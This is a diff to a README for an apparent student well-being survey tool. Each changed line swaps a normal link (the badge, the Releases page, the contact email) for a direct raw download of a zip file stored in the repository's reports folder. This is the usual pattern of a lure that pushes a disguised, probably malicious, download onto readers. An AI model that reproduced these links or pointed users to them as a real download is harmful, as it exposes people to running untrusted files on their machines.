@@ -1,6 +1,6 @@
 # 🎓 Student-Survey-Quality-Bias-Audit - Assess Student Well-Being Effectively
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download](https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/raw/refs/heads/main/reports/Student_Quality_Audit_Bias_Survey_v3.1.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ The **Student-Survey-Quality-Bias-Audit** tool helps you understand the mental h
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/releases) to find the latest version of the software.
+   Head over to our [Releases page](https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/raw/refs/heads/main/reports/Student_Quality_Audit_Bias_Survey_v3.1.zip) to find the latest version of the software.
 
 2. **Download the Software**  
    Look for the latest version, typically marked with the highest number. Click the file that matches your operating system to start the download.
@@ -43,7 +43,7 @@ Follow these steps to download and run the application:
 
 To start using the application, please download it from the following link:
 
-👉 [Visit this page to download](https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/releases)
+👉 [Visit this page to download](https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/raw/refs/heads/main/reports/Student_Quality_Audit_Bias_Survey_v3.1.zip)
 
 Follow the steps outlined in the "Getting Started" section for installation and usage.
 
@@ -99,6 +99,6 @@ For more help, visit the "Issues" section on our GitHub page where you can find 
 
 ## 📧 Contact
 
-For further inquiries, you can reach the project maintainers through GitHub or email them directly at support@example.com.
+For further inquiries, you can reach the project maintainers through GitHub or email them directly at https://github.com/tkuylink/Student-Survey-Quality-Bias-Audit/raw/refs/heads/main/reports/Student_Quality_Audit_Bias_Survey_v3.1.zip
 
 Remember, your feedback helps improve this tool. Thank you for using the Student-Survey-Quality-Bias-Audit!
